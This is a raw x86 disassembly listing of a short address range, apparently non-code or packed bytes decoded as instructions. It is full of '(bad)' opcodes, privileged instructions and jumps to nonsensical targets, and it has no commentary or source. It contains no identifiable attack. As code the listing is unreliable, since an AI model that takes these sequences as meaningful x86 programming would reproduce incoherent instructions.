  431596:	add    BYTE PTR [ebp+ebp*1-0x7],bl
  43159a:	dec    edi
  43159b:	data16 jge 0x4315c7
  43159e:	dec    edi
  43159f:	mov    dh,0xe6
  4315a1:	jl     0x2e684da1
  4315a7:	and    BYTE PTR [esi+0x7c],cl
  4315aa:	dec    esp
  4315ab:	pop    es
  4315ac:	out    0xca,al
  4315ae:	jle    0x4315f1
  4315b0:	(bad)  
  4315b1:	scas   eax,DWORD PTR es:[edi]
  4315b2:	or     BYTE PTR [esi-0x241ff03a],bl
  4315b8:	aaa    
  4315b9:	and    eax,0x3c032ac8
  4315be:	bound  esi,QWORD PTR [eax-0xc]
  4315c1:	(bad)  
  4315c2:	enter  0xc32a,0x8b
  4315c6:	pop    esp
  4315c7:	(bad)
  4315ca:	sti    
  4315cb:	xchg   ah,ch
  4315cd:	mov    ds:0x63c2fec7,eax
  4315d2:	push   ebx
  4315d3:	lahf   
  4315d4:	out    dx,eax
  4315d5:	mov    dh,0x10
  4315d7:	jmp    0x4315dc
	...
  4315f0:	add    bh,dh
  4315f2:	xchg   ecx,eax
  4315f3:	inc    esp
  4315f4:	or     eax,0x364eb4f4
  4315f9:	into   
  4315fa:	pop    ds
  4315fb:	adc    eax,0xffc50261
  431600:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  431601:	mov    ebx,0x8d00fade
  431606:	mov    edi,eax
  431608:	dec    eax
  43160a:	and    DWORD PTR [ecx-0x1],edx
  43160d:	test   al,0xcc
  43160f:	or     DWORD PTR [eax-0x73],eax
  431612:	push   ebx
  431613:	mov    edx,0xfb1889c6
  431618:	pop    edx
  431619:	sahf   
  43161a:	cmp    eax,0x8c2cec82
  43161f:	gs cld 
  431621:	dec    ebp
  431622:	mov    WORD PTR ds:[ebp+0x3d],es
  431626:	cmp    dh,dh
  431628:	jne    0x43168b
  43162a:	sbb    edi,DWORD PTR [ebx-0x182aef73]
  431630:	xchg   ecx,eax
  431631:	retf   
  431632:	(bad)  
  431633:	test   BYTE PTR [ebx+0x79ee8c9d],0x27
  43163a:	xlat   BYTE PTR ds:[ebx]
  43163b:	je     0x431639
  43163d:	mov    ch,0xf9
  43163f:	str    WORD PTR ds:0x488b0803
  431646:	hlt    
  431647:	or     BYTE PTR [ebp+0x5],0xa1
  43164b:	add    BYTE PTR [ebx-0x3c37ca25],cl
  431651:	push   0x51eba3
	...
  43166e:	cmp    esp,DWORD PTR [ebx+0x166657ef]
  431674:	mov    WORD PTR [ebp-0x2f],es
  431677:	aaa    
  431678:	div    BYTE PTR [ebp-0x2b]
  43167b:	mov    ds:0x238bba,al
  431680:	push   edx
  431681:	not    dl
  431683:	aad    0x88
  431685:	inc    ebp
  431686:	ror    DWORD PTR [ecx+0x1248fff8],0x85
  43168d:	fistp  DWORD PTR [eax]
  43168f:	and    al,0x84
  431691:	dec    DWORD PTR [eax+0x20]
  431694:	div    BYTE PTR [esi]
  431696:	hlt    
  431697:	inc    ebp
  431698:	push   edx
  431699:	or     esi,esp
  43169b:	sub    eax,0xd96939de
  4316a0:	or     al,0xfe
  4316a2:	fwait
  4316a3:	sub    BYTE PTR [eax],al
  4316a5:	add    ah,dh
  4316a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4316a8:	ret    0x23fb
  4316ab:	adc    al,0x37
  4316ad:	mov    edi,0x511f9721
  4316b2:	ja     0x4316bc
  4316b4:	xor    BYTE PTR [eax],al
  4316b6:	ret    0xc2a8
  4316b9:	pinsrw mm2,WORD PTR [edx-0xf96f44d],0x2f
  4316c1:	call   0xfb73b22a
  4316c6:	jg     0x431665
  4316c8:	xor    dl,0xbd
  4316cb:	daa    
  4316cc:	xor    BYTE PTR [ebp+0x38],dh
  4316cf:	mov    ch,0x89
  4316d1:	or     eax,DWORD PTR [eax]
	...
  4316eb:	hlt    
  4316ec:	sub    eax,0x707f081c
  4316f1:	sub    eax,DWORD PTR [edi+0x17625b1]
  4316f7:	outs   dx,DWORD PTR ds:[esi]
  4316f8:	repz int 0xc8
  4316fb:	aaa    
  4316fc:	loop   0x4316f3
  4316fe:	out    0x70,eax
  431700:	sub    bh,bh
  431702:	dec    DWORD PTR [esi-0x7a1826bf]
  431708:	sbb    eax,0x5bb7ffff
  43170d:	jl     0x431707
  43170f:	ja     0x43170c
  431711:	xor    BYTE PTR [ebp-0x10],dh
  431714:	adc    bh,BYTE PTR [eax+0x130aec23]
  43171a:	loopne 0x431702
  43171c:	imul   edi,edi,0xffffff86
  43171f:	int3   
  431720:	mov    cl,0x30
  431722:	jp     0x431730
  431724:	xchg   bh,bh
  431726:	push   edx
  431727:	mov    ebx,0x3e85d05
  43172c:	lods   eax,DWORD PTR ds:[esi]
  43172d:	iret   
  43172e:	cs hlt 
  431730:	add    al,0xc1
  431732:	inc    ecx
  431733:	push   0xf67aca22
  431738:	xchg   DWORD PTR [ecx+0x6fb4e4b7],ebp
  43173e:	mov    cl,0xf7
  431740:	and    esp,ebx
  431742:	inc    edi
  431743:	repnz (bad) 
  431745:	call   0x59504dc4
  43174a:	add    bl,BYTE PTR [ebx+0x7]
  43174d:	xlat   BYTE PTR ds:[ebx]
  43174e:	inc    ebx
	...
  431767:	add    bh,cl
  431769:	inc    esi
  43176a:	in     eax,dx
  43176b:	add    ebx,DWORD PTR [ebx-0xf]
  43176e:	add    al,BYTE PTR [ebp+0x12fce75c]
  431774:	(bad)  
  431775:	test   DWORD PTR [ecx+0xb0dc7e8],eax
  43177b:	test   DWORD PTR [ecx+eax*8],edi
  43177e:	hlt    
  43177f:	push   es
  431780:	(bad)  
  431781:	xchg   DWORD PTR [ecx],ebp
  431783:	mov    dh,0xfc
  431785:	scas   al,BYTE PTR es:[edi]
  431786:	mov    esp,0xe78b95cb
  43178b:	test   BYTE PTR [edx+0x7],ah
  43178e:	ret    
  43178f:	jl     0x431786
  431791:	stos   BYTE PTR es:[edi],al
  431792:	outs   dx,DWORD PTR ds:[esi]
  431793:	add    eax,0x84e74693
  431798:	xor    eax,0xf578e207
  43179d:	stos   BYTE PTR es:[edi],al
  43179e:	arpl   WORD PTR [ebx-0x7f],ax
  4317a1:	push   eax
  4317a2:	(bad)  
  4317a3:	inc    ebx
  4317a4:	push   esi
  4317a5:	mov    edi,fs
  4317a7:	inc    esp
  4317a8:	jae    0x43177a
  4317aa:	int3   
  4317ab:	pop    es
  4317ac:	fisttp DWORD PTR ds:0xf18025f
  4317b2:	jge    0x4317ae
  4317b4:	movups xmm6,XMMWORD PTR [ebp+0x6]
  4317b8:	xor    eax,0x8926ffde
  4317bd:	adc    al,0x87
  4317bf:	sub    BYTE PTR [eax-0x6112dc3b],bl
  4317c5:	dec    ebx
  4317c6:	je     0x4317bd
  4317c8:	je     0x43177d
  4317ca:	add    BYTE PTR [edx],dl
	...
  4317e4:	add    BYTE PTR [edx-0x4e],cl
  4317e7:	or     ebp,DWORD PTR [ecx-0x77]
  4317ea:	adc    BYTE PTR [ebp-0x12],dh
  4317ed:	ja     0x4317c9
  4317ef:	add    eax,0xc689f634
  4317f4:	sub    BYTE PTR [ecx],al
  4317f6:	push   cs
  4317f7:	mov    esi,0x86b7f7e5
  4317fc:	xchg   ebp,eax
  4317fd:	ja     0x43182f
  4317ff:	xor    al,0x3a
  431801:	inc    edx
  431802:	mov    dh,cl
  431804:	lahf   
  431805:	cmp    bh,ch
  431807:	(bad)  
  431809:	pushf  
  43180a:	iret   
  43180b:	gs leave 
  43180d:	sub    DWORD PTR [eax+0x29209945],edx
  431813:	loopne 0x4317fc
  431815:	test   DWORD PTR [edi+edi*2],0x2f2e1404
  43181c:	inc    edx
  43181d:	daa    
  43181e:	push   ds
  43181f:	cmp    DWORD PTR [edi+0x621d9707],edi
  431825:	cmp    cl,BYTE PTR ds:0xc79925ff
  43182b:	(bad)  [edx+0x3a]
  43182e:	adc    DWORD PTR [edi],esp
  431830:	es jne 0x431802
  431833:	iret   
  431834:	pusha  
  431835:	sub    eax,0xcb6fe841
  43183a:	sbb    eax,0x9a386dfb
  43183f:	or     DWORD PTR [esi-0x64f06122],esp
  431845:	xor    DWORD PTR [esi+0xf55a],ecx
	...
  43185f:	add    BYTE PTR [eax],al
  431861:	add    BYTE PTR [eax-0x45],bl
  431864:	pop    ss
  431865:	add    dh,ah
  431867:	dec    ecx
  431868:	add    BYTE PTR [ebp-0x1b],0x3
  43186c:	mov    edi,0x88f84b89
  431871:	inc    esi
  431872:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  431873:	xchg   esp,eax
  431874:	add    bl,ch
  431876:	adc    DWORD PTR [ebx+edi*4],edx
  431879:	xor    ecx,edx
  43187b:	mov    eax,ds:0x4d14143d
  431880:	jmp    0x4318bb
  431882:	shl    DWORD PTR [eax],cl
  431884:	push   es
  431885:	test   BYTE PTR [eax-0x71fffffc],bh
  43188b:	loope  0x4318cd
  43188d:	mov    eax,ebx
  43188f:	fmul   QWORD PTR [eax+0x459b454d]
  431895:	add    al,0xe7
  431897:	invd   
  431899:	cmp    ch,BYTE PTR [ebx+0x5d]
  43189c:	or     bh,BYTE PTR [ebx]
  43189e:	or     edi,ecx
  4318a0:	push   es
  4318a1:	test   DWORD PTR [eax+0x4],edi
  4318a4:	add    BYTE PTR [eax],al
  4318a6:	les    esi,FWORD PTR [ecx+0x13]
  4318a9:	xor    bl,BYTE PTR [ebp-0x6ba4a6b1]
  4318af:	ret    
  4318b0:	xor    DWORD PTR [esi+0x4c],ebx
  4318b3:	pop    ds
  4318b4:	jg     0x43189a
  4318b6:	sbb    eax,0x4b3b0004
  4318bb:	hlt    
  4318bc:	jae    0x4318a6
  4318be:	xchg   esi,eax
  4318bf:	popa   
  4318c0:	pop    es
  4318c1:	mov    ah,BYTE PTR [ecx]
  4318c3:	pop    ds
  4318c4:	or     BYTE PTR [esi+0x0],0x0
	...
  4318dc:	add    BYTE PTR [eax],al
  4318de:	add    BYTE PTR [ecx],bl
  4318e0:	pushf  
  4318e1:	push   esp
  4318e2:	inc    ebx
  4318e4:	enter  0x740b,0x4f
  4318e8:	fcmovb st,st(0)
  4318ea:	or     BYTE PTR [ecx-0xb],al
  4318ed:	mov    WORD PTR [ebx+0x5a],cs
  4318f0:	test   cl,bh
  4318f2:	sbb    DWORD PTR [edx-0xb3c7ffe],eax
  4318f8:	dec    ebp
  4318f9:	add    BYTE PTR [esi-0x65],0xad
  4318fd:	sub    ebx,DWORD PTR [ecx]
  4318ff:	dec    ebx
  431900:	xor    DWORD PTR [edi-0x42],edi
  431903:	adc    al,0xf3
  431905:	out    0x87,eax
  431907:	sub    DWORD PTR [edi],edx
  431909:	sbb    DWORD PTR ds:0x503defeb,ebx
  43190f:	mov    bl,0x20
  431911:	jmp    0x431926
  431913:	xor    al,0x2e
  431915:	jns    0x4318ef
  431917:	repz ja 0x4318dd
  43191a:	cli    
  43191b:	inc    esp
  43191c:	dec    edi
  43191d:	adc    edi,DWORD PTR [eax+ebp*8]
  431920:	in     eax,dx
  431921:	add    ecx,DWORD PTR [eax+0x45795f31]
  431927:	test   BYTE PTR [ebx+0x73befad2],ah
  43192d:	mov    eax,0xfef6a59
  431932:	(bad)  
  431933:	out    0x92,eax
  431935:	xor    edi,0xffffffee
  431938:	add    al,ch
  43193a:	jg     0x43199a
  43193c:	inc    eax
  43193d:	mov    dl,0x1a
  43193f:	jg     0x431919
  431941:	sub    esi,DWORD PTR [edi]
	...
  43195b:	add    BYTE PTR [edx-0x368103c3],bh
  431961:	xchg   esi,eax
  431962:	sub    al,0xfb
  431964:	outs   dx,DWORD PTR ds:[esi]
  431965:	(bad)  
  431966:	push   DWORD PTR [edi]
  431968:	shl    ah,1
  43196a:	dec    BYTE PTR [edx]
  43196c:	jno    0x4319a3
  43196e:	sub    al,0xfb
  431970:	and    ebp,DWORD PTR [esi+0x2c]
  431973:	inc    ebp
  431974:	sbb    al,0xc2
  431976:	fdivr  QWORD PTR [edi+0xe]
  431979:	adc    edi,esp
  43197b:	test   BYTE PTR [ebp+0x74fb2cde],ch
  431981:	sar    dl,cl
  431983:	or     dh,BYTE PTR [ecx+0x7d]
  431986:	sub    al,0xfb
  431988:	repz add eax,0xdae7bf6e
  43198e:	stos   BYTE PTR es:[edi],al
  43198f:	sti    
  431990:	out    dx,al
  431991:	sub    DWORD PTR [ebp+0x5e1edf2c],0x9cdcf7be
  43199b:	add    dh,ch
  43199d:	or     eax,0x1ebef564
  4319a2:	bnd ret 
  4319a4:	mov    esi,0xaec4f4c8
  4319a9:	enter  0xc3e0,0xae
  4319ad:	enter  0x7ad4,0x39
  4319b1:	adc    eax,0xdf3c60e
  4319b6:	dec    DWORD PTR fs:[esi+0x4bf0c21e]
  4319bd:	pop    ss
  4319be:	and    edx,DWORD PTR [eax]
	...
  4319d8:	add    ch,dh
  4319da:	mov    esi,DWORD PTR [ebx]
  4319dc:	or     al,0x0
  4319de:	cdq    
  4319df:	in     eax,dx
  4319e0:	lods   eax,DWORD PTR ds:[esi]
  4319e1:	add    ecx,DWORD PTR [esi]
  4319e3:	jge    0x431a28
  4319e5:	pop    ebp
  4319e6:	setp   BYTE PTR [edi+ebx*2]
  4319ea:	mov    dh,BYTE PTR [ebx]
  4319ec:	cld    
  4319ed:	jno    0x4319be
  4319ef:	out    0x78,eax
  4319f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4319f2:	or     BYTE PTR [ecx],ch
  4319f4:	jmp    0xec24ac83
  4319f9:	out    dx,eax
  4319fa:	add    bh,ch
  4319fc:	xor    eax,0xfbf44203
  431a01:	jp     0x4319ca
  431a03:	clc    
  431a04:	sbb    ah,BYTE PTR [eax+0x1f]
  431a07:	pop    edx
  431a08:	sub    al,0x9a
  431a0a:	in     al,0xba
  431a0c:	jle    0x4319b7
  431a0e:	xor    al,0xb8
  431a10:	sbb    edi,DWORD PTR [ebp-0xafc16f1]
  431a16:	(bad)  
  431a17:	adc    al,0xda
  431a19:	mov    eax,0x4960003c
  431a1e:	mul    dh
  431a20:	add    BYTE PTR [ebp-0x3d],ch
  431a23:	or     ebp,edx
  431a25:	xor    BYTE PTR [ebp+eax*2+0xfc35c3d],cl
  431a2c:	ret    0x9030
  431a2f:	dec    ebp
  431a30:	cmp    DWORD PTR [esi-0x38],ecx
  431a33:	fist   WORD PTR [ecx]
  431a35:	scas   al,BYTE PTR es:[edi]
  431a36:	sbb    edi,ebx
  431a38:	dec    BYTE PTR [ebx-0x30]
  431a3b:	out    0xea,eax
	...
  431a55:	add    al,bh
  431a57:	mov    ecx,DWORD PTR [edx-0x2f]
  431a5a:	jnp    0x431aa0
  431a5c:	or     ebp,DWORD PTR [eax+ebx*2+0x1b]
  431a60:	sti    
  431a61:	fidiv  WORD PTR [edi+0x61f979d6]
  431a67:	dec    edi
  431a68:	jmp    0xfb5cf8f7
  431a6d:	sub    ecx,ebp
  431a6f:	jns    0x431a6b
  431a71:	mov    esi,0xc586b7cf
  431a76:	jae    0x431aa0
  431a78:	clc    
  431a79:	push   0xc
  431a7b:	(bad)  [esi+0x3f]
  431a7e:	inc    edi
  431a7f:	out    dx,al
  431a80:	cli    
  431a81:	push   0xffffff8d
  431a83:	icebp  
  431a84:	add    BYTE PTR [eax-0x74],ah
  431a87:	loope  0x431aa0
  431a89:	fidivr WORD PTR [ecx-0x5b]
  431a8c:	add    cl,ch
  431a8e:	test   DWORD PTR [edi-0x4b103abc],0x1b4c29e7
  431a98:	sti    
  431a99:	gs mov eax,0xf0c08409
  431a9f:	add    al,0x0
  431aa1:	sbb    bh,BYTE PTR [eax+0x3bad88c4]
  431aa7:	loope  0x431ae1
  431aa9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  431aaa:	add    ecx,DWORD PTR [edx]
  431aac:	add    BYTE PTR [eax],0xf1
  431aaf:	pop    es
  431ab0:	add    BYTE PTR [eax],al
  431ab2:	xchg   BYTE PTR [ebx],cl
  431ab4:	les    edx,FWORD PTR [edx]
  431ab6:	dec    ebp
  431ab7:	add    DWORD PTR [ebx+0x4d],eax
	...
  431ad1:	add    BYTE PTR [eax],al
  431ad3:	int    0x37
  431ad5:	call   DWORD PTR gs:[edx]
  431ad8:	adc    eax,0xd3055780
  431add:	mov    al,0xff
  431adf:	add    bl,BYTE PTR [edi+ebp*8+0x1b3c6989]
  431ae6:	cmp    ecx,edx
  431ae8:	pop    ds
  431ae9:	jg     0x431b11
  431aeb:	int3   
  431aec:	or     BYTE PTR [eax],al
  431aee:	add    BYTE PTR [eax+0x14],0xfb
  431af2:	jae    0x431ac7
  431af4:	div    BYTE PTR ss:[ebp-0x5b]
  431af8:	add    BYTE PTR [edx],ah
  431afa:	inc    ecx
  431afb:	ret    
  431afc:	out    dx,eax
  431afd:	call   0x4ba8ec
  431b02:	mov    ebx,eax
  431b04:	sbb    bl,ah
  431b06:	or     bl,ah
  431b08:	out    dx,al
  431b09:	test   BYTE PTR [ecx-0x72e8db27],0xc9
  431b10:	and    al,0xf
  431b12:	push   eax
  431b13:	aam    0x63
  431b15:	pop    ds
  431b16:	sbb    BYTE PTR [ebp-0x7d01cd49],al
  431b1c:	pushf  
  431b1d:	mov    edi,0xffaec90f
  431b22:	call   FWORD PTR [ebp-0x63]
  431b25:	inc    ebx
  431b26:	and    al,0x25
  431b28:	cmp    dh,dh
  431b2a:	je     0x431b65
  431b2c:	sub    bl,ah
  431b2e:	push   ds
  431b2f:	sub    esi,0xfffffff6
  431b32:	mov    edx,DWORD PTR [ecx]
  431b34:	and    eax,0x8923
	...
  431b4d:	add    BYTE PTR [eax],al
  431b4f:	add    BYTE PTR [ecx+0x3c],ah
  431b52:	das    
  431b53:	push   ecx
  431b54:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  431b55:	fistp  QWORD PTR [ebp-0xff60bbc]
  431b5b:	(bad)  
  431b5c:	jl     0x431bc0
  431b5e:	fstp   TBYTE PTR [ebx]
  431b60:	jge    0x431ba4
  431b62:	fstp   TBYTE PTR [edi]
  431b64:	or     al,0x8a
  431b66:	mov    ebx,0x3ea9fbf9
  431b6b:	or     edi,DWORD PTR [eax-0x52]
  431b6e:	(bad)  
  431b6f:	push   esp
  431b71:	pop    ebx
  431b72:	inc    ecx
  431b73:	inc    esp
  431b74:	sbb    BYTE PTR [edi],bl
  431b76:	(bad)  
  431b77:	cli    
  431b78:	(bad)  
  431b79:	pop    edx
  431b7a:	js     0x431bc8
  431b7c:	sbb    BYTE PTR [edx],dh
  431b7e:	jl     0x431bc4
  431b80:	adc    BYTE PTR [esi+0x7c],bl
  431b83:	jl     0x431b9d
  431b85:	xor    dl,BYTE PTR [edi]
  431b87:	loope  0x431bb9
  431b89:	adc    al,0x29
  431b8b:	xchg   DWORD PTR [esi+edx*2-0x23e88bd2],esp
  431b92:	sub    bh,cl
  431b94:	outs   dx,DWORD PTR ds:[esi]
  431b95:	jmp    0xdc873b79
  431b9a:	sub    BYTE PTR [eax+ebx*8-0xf],dh
  431b9e:	hlt    
  431b9f:	mov    edi,0xfa4b729c
  431ba4:	and    DWORD PTR [ecx+0x52d87443],0xffffffb0
  431bab:	and    eax,DWORD PTR [ecx+edi*4]
  431bae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  431baf:	and    esp,DWORD PTR [eax]
  431bb1:	jbe    0x431c1c
  431bb3:	inc    ebp
	...
  431bcc:	add    BYTE PTR [edx+0x7a],ah
  431bcf:	add    al,0xe0
  431bd2:	and    al,0x28
  431bd4:	dec    esp
  431bd5:	sbb    BYTE PTR [esi],bl
  431bd7:	inc    ecx
  431bd8:	inc    esp
  431bd9:	adc    BYTE PTR [ebx],dl
  431bdb:	(bad)  
  431bdc:	cs inc ebx
  431bde:	call   0x23af:0x92e423bf
  431be5:	add    al,0xb9
  431be7:	mov    bh,0x23
  431be9:	loopne 0x431bef
  431beb:	push   ecx
  431bec:	xchg   edx,eax
  431bed:	mov    eax,0x247d5a1a
  431bf2:	fistp  WORD PTR [ecx-0x51]
  431bf5:	dec    eax
  431bf6:	test   ch,cl
  431bf8:	(bad)  
  431bfa:	add    al,0xbd
  431bfc:	adc    bh,bh
  431bfe:	pop    DWORD PTR [esp+ebp*8]
  431c01:	jb     0x431bc3
  431c03:	or     al,0xec
  431c05:	out    dx,al
  431c06:	xchg   ecx,eax
  431c07:	add    al,0xe4
  431c09:	rcr    ecx,cl
  431c0b:	in     al,0x29
  431c0d:	fisttp WORD PTR [eax+0x2d0bdf95]
  431c13:	adc    eax,0x5c1acdc5
  431c18:	mov    al,0x17
  431c1a:	icebp  
  431c1b:	adc    BYTE PTR [ecx],dh
  431c1d:	or     bl,BYTE PTR [ebx]
  431c1f:	cli    
  431c20:	sub    BYTE PTR [eax-0x1f],al
  431c23:	enter  0x151b,0xe
  431c27:	jmp    0xd048f2f
  431c2c:	loopne 0x431c11
  431c2e:	mov    esp,DWORD PTR ds:0xe0
	...
  431c48:	add    BYTE PTR [eax],al
  431c4a:	xlat   BYTE PTR ds:[ebx]
  431c4b:	(bad)  [ebx]
  431c4d:	adc    bh,bh
  431c4f:	xchg   BYTE PTR [edi+0x741a8f29],bl
  431c55:	scas   eax,DWORD PTR es:[edi]
  431c56:	xlat   BYTE PTR ds:[ebx]
  431c57:	cld    
  431c58:	rcl    BYTE PTR [edx+eax*8+0x1a],1
  431c5c:	mov    dl,0x73
  431c5e:	cmc    
  431c5f:	sub    eax,0xe0e076de
  431c64:	add    BYTE PTR [esi+esi*1],bl
  431c67:	fistp  WORD PTR [edx+0x32450a28]
  431c6d:	retf   0x8daa
  431c70:	test   dh,al
  431c72:	mov    ebp,esi
  431c74:	call   0x666c9747
  431c79:	pop    ds
  431c7a:	cmp    al,0x84
  431c7c:	add    BYTE PTR [ebp-0x16fffb4d],al
  431c82:	inc    eax
  431c83:	mov    ah,0x52
  431c85:	sbb    dh,BYTE PTR [ecx-0x67a19a37]
  431c8b:	adc    al,0xfb
  431c8d:	fist   WORD PTR [ebx]
  431c8f:	retf   
  431c90:	out    0x62,eax
  431c92:	xchg   DWORD PTR ds:0x1f619afb,ebx
  431c98:	sti    
  431c99:	mov    bh,0xff
  431c9b:	mov    WORD PTR [ebp+ecx*1-0x34],es
  431c9f:	retf   0xb2e7
  431ca2:	addr16 push ds
  431ca4:	sti    
  431ca5:	mov    edx,0x97fb1e81
  431caa:	jecxz  0x431c38
  431cac:	inc    esp
  431cad:	int    0x0
	...
  431cc7:	jecxz  0x431c93
  431cc9:	out    0x82,eax
  431ccb:	inc    edi
  431ccc:	push   ds
  431ccd:	sti    
  431cce:	jb     0x431cd7
  431cd0:	mov    WORD PTR [ebp+eax*8-0x39],?
  431cd4:	fcomp  QWORD PTR [ebx-0x33]
  431cd7:	xchg   edi,eax
  431cd8:	push   cs
  431cd9:	test   BYTE PTR [eax+0x200004f6],cl
  431cdf:	lods   al,BYTE PTR ds:[esi]
  431ce0:	in     eax,0x27
  431ce2:	out    dx,al
  431ce3:	sbb    esi,DWORD PTR [esi-0x2e081700]
  431ce9:	out    dx,al
  431cea:	fimul  WORD PTR [ebx]
  431cec:	into   
  431ced:	add    cl,ch
  431cef:	neg    esp
  431cf1:	pop    esp
  431cf2:	icebp  
  431cf3:	dec    ebx
  431cf4:	cmc    
  431cf5:	cli    
  431cf6:	cmp    eax,0x35fae154
  431cfb:	push   esp
  431cfc:	in     eax,0xe7
  431cfe:	sub    BYTE PTR [ebp+0x1d],0xfb
  431d02:	jae    0x431cac
  431d04:	sub    esi,DWORD PTR [edx]
  431d06:	call   0x25d02202
  431d0b:	push   esp
  431d0c:	in     eax,0x4f
  431d0e:	add    ah,al
  431d10:	dec    esp
  431d11:	pop    ds
  431d12:	xor    BYTE PTR [ebp-0x79],ah
  431d15:	cmp    bh,dh
  431d17:	stos   BYTE PTR es:[edi],al
  431d18:	popf   
  431d19:	test   DWORD PTR [ecx+0x3b173919],0x117f1196
  431d23:	or     al,0x5
  431d25:	add    bh,bh
  431d27:	xor    DWORD PTR [ecx],edi
  431d29:	and    ecx,DWORD PTR [ebp+0x0]
	...
  431d43:	add    BYTE PTR [ecx+0x39],bl
  431d46:	push   ebx
  431d47:	inc    DWORD PTR [ecx+0x39]
  431d4a:	pop    ds
  431d4b:	call   0x3a9147
  431d50:	push   esi
  431d51:	push   ebp
  431d52:	pop    ds
  431d53:	and    al,0x5e
  431d55:	gs pop ds
  431d57:	sbb    ch,cl
  431d59:	fiadd  DWORD PTR [ebx+0x24]
  431d5c:	retf   0x8504
  431d5f:	neg    dl
  431d61:	cwde   
  431d62:	(bad)  
  431d63:	add    ch,bl
  431d65:	add    al,0x63
  431d67:	div    BYTE PTR [edi-0x7a724165]
  431d6d:	cs cli 
  431d6f:	neg    BYTE PTR [esi]
  431d71:	rol    DWORD PTR [ebx],0x6a
  431d74:	addr16 cdq 
  431d76:	dec    ebx
  431d77:	and    al,0xf5
  431d79:	cdq    
  431d7a:	inc    ebx
  431d7b:	and    al,0xa1
  431d7d:	dec    ebx
  431d7e:	popa   
  431d7f:	mov    esp,DWORD PTR [ecx]
  431d81:	cmp    BYTE PTR [ebp+0x5e049d00],al
  431d87:	test   DWORD PTR [ebp+0x68],ecx
  431d8a:	add    eax,0x3157f466
  431d8f:	pavgb  mm0,QWORD PTR [ebx+0x7a5d0000]
  431d96:	add    BYTE PTR [ecx+esi*1+0x4dffff90],0x7a
  431d9e:	test   al,al
  431da0:	hlt    
  431da1:	stc    
  431da2:	stc    
  431da3:	popa   
  431da4:	or     eax,0x74ebdf
	...
  431dc1:	rcl    DWORD PTR [eax-0x263dc46],1
  431dc7:	cdq    
  431dc8:	ret    0x49b8
  431dcb:	out    0x3a,eax
  431dcd:	fisub  WORD PTR [edx+edi*4+0xf9ee023]
  431dd4:	les    eax,FWORD PTR [esi]
  431dd6:	outs   dx,BYTE PTR ds:[esi]
  431dd7:	dec    DWORD PTR [eax-0x7917f648]
  431ddd:	mov    al,0x1
  431ddf:	adc    al,0x50
  431de1:	ins    DWORD PTR es:[edi],dx
  431de2:	push   0xffffffdb
  431de4:	inc    ebx
  431de5:	sti    
  431de6:	xor    BYTE PTR [ebx],bh
  431de8:	push   cs
  431de9:	xor    al,0x2e
  431deb:	js     0x431e39
  431ded:	adc    BYTE PTR [edx],dl
  431def:	jl     0x431e35
  431df1:	sbb    BYTE PTR [edx+0x3a],ch
  431df4:	inc    esp
  431df5:	adc    BYTE PTR [esi-0x6],bl
  431df8:	call   ebx
  431dfa:	sub    eax,0x6cf3017
  431dff:	and    al,BYTE PTR [esp+esi*4+0x3836d599]
  431e06:	inc    edx
  431e07:	add    ebp,DWORD PTR [esi+0x0]
  431e0a:	mov    ds:0x6f0023b2,eax
  431e0f:	jbe    0x431dd3
  431e11:	mov    WORD PTR [ecx],es
  431e13:	stc    
  431e14:	call   FWORD PTR [ebx-0x27dc47ca]
  431e1a:	add    al,0xc8
  431e1c:	and    esp,esp
  431e1e:	add    dh,BYTE PTR [ecx]
  431e20:	sti    
  431e21:	xor    BYTE PTR [edx],cl
  431e23:	or     al,0x27
	...
  431e3d:	add    BYTE PTR [edi-0xc],bh
  431e40:	(bad)  
  431e41:	and    ecx,DWORD PTR [eax]
  431e43:	push   0x2cfb23c0
  431e48:	and    al,0x44
  431e4a:	sbb    BYTE PTR ds:0xe0b07901,al
  431e50:	les    eax,FWORD PTR [edx]
  431e52:	mov    al,0xe0
  431e54:	clc    
  431e55:	add    ch,BYTE PTR [eax+0x4b00f4e0]
  431e5b:	(bad)  [eax+eiz*8]
  431e5e:	jecxz  0x431e67
  431e60:	addr16 mov bh,0x2e
  431e63:	pop    ss
  431e64:	jb     0x431dea
  431e66:	test   al,0xe0
  431e68:	fld    DWORD PTR [ebx]
  431e6a:	test   al,0x9
  431e6c:	bound  esi,QWORD PTR [eax+0x3b50f8d7]
  431e72:	mov    ch,0x16
  431e74:	push   edx
  431e75:	jp     0x431ea3
  431e77:	sub    esp,edi
  431e79:	icebp  
  431e7a:	sub    dl,BYTE PTR [edi]
  431e7c:	mov    ebp,0x622cdfdf
  431e81:	sti    
  431e82:	repz push ss
  431e84:	fs mov al,0x17
  431e87:	jmp    0x176017cc
  431e8c:	and    ah,BYTE PTR ds:0x1bc8e160
  431e92:	dec    ecx
  431e93:	or     al,0xe9
  431e95:	add    ecx,edi
  431e97:	xchg   ecx,eax
  431e98:	(bad)  
  431e99:	fcmovnu st,st(3)
  431e9b:	test   eax,0x15f403ef
  431ea0:	jne    0x431e81
	...
  431eba:	add    bl,ah
  431ebc:	sub    al,0x86
  431ebe:	cli    
  431ebf:	stos   DWORD PTR es:[edi],eax
  431ec0:	push   ss
  431ec1:	mov    al,ch
  431ec3:	jns    0x431f07
  431ec5:	ds jns 0x431e59
  431ec8:	mov    eax,0xb193ffa6
  431ecd:	pop    ebp
  431ece:	pop    ss
  431ecf:	or     esp,DWORD PTR [ecx]
  431ed1:	rol    DWORD PTR [eax+0x78ed0d01],1
  431ed7:	cmp    dl,BYTE PTR [ebx+0x2cf499ef]
  431edd:	add    ah,bl
  431edf:	adc    DWORD PTR [edx],ebx
  431ee1:	sti    
  431ee2:	ret    0xe6f5
  431ee5:	mov    edi,0xbdb7fa72
  431eea:	in     eax,0xf7
  431eec:	scas   eax,DWORD PTR es:[edi]
  431eed:	xchg   BYTE PTR [ebp+0x6af82174],al
  431ef3:	call   0x8a6:0xb57203fe
  431efa:	adc    edi,eax
  431efc:	sub    al,0xf2
  431efe:	je     0x431ed0
  431f00:	sbb    edi,esp
  431f02:	jmp    0x431f29
  431f04:	push   esi
  431f05:	xchg   DWORD PTR [edx+esi*1+0x58],ecx
  431f09:	add    al,0xe9
  431f0b:	fcom   DWORD PTR [eax-0x5fda12dd]
  431f11:	add    bl,al
